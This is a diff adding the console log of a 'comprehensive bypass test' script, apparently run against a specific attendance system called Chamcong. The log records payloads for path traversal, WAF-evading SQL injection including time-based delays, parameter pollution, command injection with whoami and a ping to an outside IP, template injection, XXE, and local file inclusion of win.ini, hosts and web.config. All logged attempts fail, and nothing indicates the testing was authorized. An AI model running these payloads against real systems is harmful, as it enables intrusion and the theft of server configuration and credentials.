@@ -1,0 +1,126 @@
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🔥 全面绕过测试 - Chamcong系统
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+[测试1] 路径遍历/目录穿越
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  report/../../../web.config: ❌ 失败 (1245 bytes)
+  report/../../web.config: ❌ 失败 (1245 bytes)
+  report/../web.config: ❌ 失败 (1245 bytes)
+  ../web.config: ❌ 失败 (1245 bytes)
+  ../../web.config: ❌ 失败 (1245 bytes)
+  ../../../web.config: ❌ 失败 (1245 bytes)
+  report/..%2f..%2fweb.config: ❌ 失败 (1245 bytes)
+  report/..%252f..%252fweb.config: ❌ 失败 (1245 bytes)
+  report/....//....//web.config: ❌ 失败 (1245 bytes)
+  report/..;/web.config: ❌ 失败 (1245 bytes)
+
+[测试2] SQL注入 - WAF绕过技术
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  MAU2'--: comprehensive_bypass_test.sh: line 76: bc: command not found
+comprehensive_bypass_test.sh: line 81: bc: command not found
+❓ 异常响应 (4410 bytes, s)
+  MAU2'#: comprehensive_bypass_test.sh: line 76: bc: command not found
+comprehensive_bypass_test.sh: line 81: bc: command not found
+❓ 异常响应 (4408 bytes, s)
+  MAU2'/**/: comprehensive_bypass_test.sh: line 76: bc: command not found
+comprehensive_bypass_test.sh: line 81: bc: command not found
+❓ 异常响应 (4420 bytes, s)
+  MAU2'/**/--: comprehensive_bypass_test.sh: line 76: bc: command not found
+comprehensive_bypass_test.sh: line 81: bc: command not found
+❓ 异常响应 (4426 bytes, s)
+  MAU2'%20--: comprehensive_bypass_test.sh: line 76: bc: command not found
+comprehensive_bypass_test.sh: line 81: bc: command not found
+❓ 异常响应 (4415 bytes, s)
+  MAU2'%09--: comprehensive_bypass_test.sh: line 76: bc: command not found
+comprehensive_bypass_test.sh: line 81: bc: command not found
+❓ 异常响应 (4417 bytes, s)
+  MAU2'%0a--: comprehensive_bypass_test.sh: line 76: bc: command not found
+comprehensive_bypass_test.sh: line 81: bc: command not found
+❓ 异常响应 (4417 bytes, s)
+  MAU2'%0d--: comprehensive_bypass_test.sh: line 76: bc: command not found
+comprehensive_bypass_test.sh: line 81: bc: command not found
+❓ 异常响应 (4417 bytes, s)
+  MAU2'%00--: comprehensive_bypass_test.sh: line 76: bc: command not found
+comprehensive_bypass_test.sh: line 81: bc: command not found
+❓ 异常响应 (4417 bytes, s)
+  MAU2' aNd 1=1--: comprehensive_bypass_test.sh: line 76: bc: command not found
+comprehensive_bypass_test.sh: line 81: bc: command not found
+❓ 异常响应 (4432 bytes, s)
+  MAU2' AnD 1=1--: comprehensive_bypass_test.sh: line 76: bc: command not found
+comprehensive_bypass_test.sh: line 81: bc: command not found
+❓ 异常响应 (4432 bytes, s)
+  MAU2'||'1'='1: comprehensive_bypass_test.sh: line 76: bc: command not found
+comprehensive_bypass_test.sh: line 81: bc: command not found
+❓ 异常响应 (4436 bytes, s)
+  MAU2'|'1'='1: comprehensive_bypass_test.sh: line 76: bc: command not found
+comprehensive_bypass_test.sh: line 81: bc: command not found
+❓ 异常响应 (4433 bytes, s)
+  MAU2'^'0: comprehensive_bypass_test.sh: line 76: bc: command not found
+comprehensive_bypass_test.sh: line 81: bc: command not found
+❓ 异常响应 (4419 bytes, s)
+  MAU2'or'1'='1: comprehensive_bypass_test.sh: line 76: bc: command not found
+comprehensive_bypass_test.sh: line 81: bc: command not found
+❓ 异常响应 (4432 bytes, s)
+  MAU2'or'x'='x: comprehensive_bypass_test.sh: line 76: bc: command not found
+comprehensive_bypass_test.sh: line 81: bc: command not found
+❓ 异常响应 (4432 bytes, s)
+  MAU2'%20or%20'1'='1: comprehensive_bypass_test.sh: line 76: bc: command not found
+comprehensive_bypass_test.sh: line 81: bc: command not found
+❓ 异常响应 (4438 bytes, s)
+  MAU2'/**/or/**/1=1--: comprehensive_bypass_test.sh: line 76: bc: command not found
+comprehensive_bypass_test.sh: line 81: bc: command not found
+❓ 异常响应 (4453 bytes, s)
+  MAU2';WAITFOR/**/DELAY/**/'0:0:5'--: comprehensive_bypass_test.sh: line 76: bc: command not found
+comprehensive_bypass_test.sh: line 81: bc: command not found
+❓ 异常响应 (4496 bytes, s)
+  MAU2';WA/**/ITFOR/**/DE/**/LAY/**/'0:0:5'--: comprehensive_bypass_test.sh: line 76: bc: command not found
+comprehensive_bypass_test.sh: line 81: bc: command not found
+❓ 异常响应 (4520 bytes, s)
+
+[测试3] 参数污染 (HPP)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  ID=MAU2&ID=../../web.config: 4452 bytes
+  X-Original-ID header: 4205 bytes
+
+[测试4] 命令注入
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  MAU2;whoami: ❌ 失败
+  MAU2|whoami: ❌ 失败
+  MAU2`whoami`: ❌ 失败
+  MAU2$(whoami): ❌ 失败
+  MAU2&whoami: ❌ 失败
+  MAU2&&whoami: ❌ 失败
+  MAU2||whoami: ❌ 失败
+  MAU2;ping 82.29.71.156: ❌ 失败
+  MAU2|ping -n 5 82.29.71.156: ❌ 失败
+
+[测试5] SSTI (Server-Side Template Injection)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+comprehensive_bypass_test.sh: line 157: ${7*7}: bad substitution
+
+[测试6] XXE注入 (通过POST数据)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  XXE测试响应: 4205 bytes
+  ❌ XXE失败
+
+[测试7] 本地文件包含 (LFI)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  c:/windows/win.ini: ❌ 失败 (3582 bytes)
+  c:/windows/system32/drivers/etc/hosts: ❌ 失败 (3631 bytes)
+  c:/inetpub/wwwroot/web.config: ❌ 失败 (3611 bytes)
+  ../../web.config: ❌ 失败 (3574 bytes)
+  ../web.config: ❌ 失败 (3565 bytes)
+  web.config: ❌ 失败 (3556 bytes)
+  /web.config: ❌ 失败 (3563 bytes)
+  c:/inetpub/logs/LogFiles/W3SVC1/u_ex251117.log: ❌ 失败 (3652 bytes)
+
+[测试8] 绕过disabled下拉框
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  强制提交disabled参数: 8086 bytes
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+全面绕过测试完成!
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+检查成功的测试:
